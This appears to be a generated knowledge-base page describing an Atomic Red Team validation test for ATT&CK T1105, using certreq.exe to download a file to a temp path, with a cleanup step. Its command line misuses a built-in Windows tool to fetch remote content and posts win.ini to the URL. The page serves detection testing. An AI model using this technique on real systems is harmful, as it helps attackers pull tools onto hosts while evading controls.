---
atomic_guid: "6fdaae87-c05b-42f8-842e-991a74e8376b"
title: "certreq download"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "6fdaae87-c05b-42f8-842e-991a74e8376b"
  - "certreq download"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# certreq download

Use certreq to download a file from the web

## Metadata

- Atomic GUID: 6fdaae87-c05b-42f8-842e-991a74e8376b
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_path

- description: Local path to place file
- type: string
- default: %temp%\Atomic-license.txt

### remote_file

- description: URL of file to copy
- type: url
- default: https://example.com

## Executor

- name: command_prompt

### Command

```commandprompt
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
```

### Cleanup

```commandprompt
del #{local_path} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
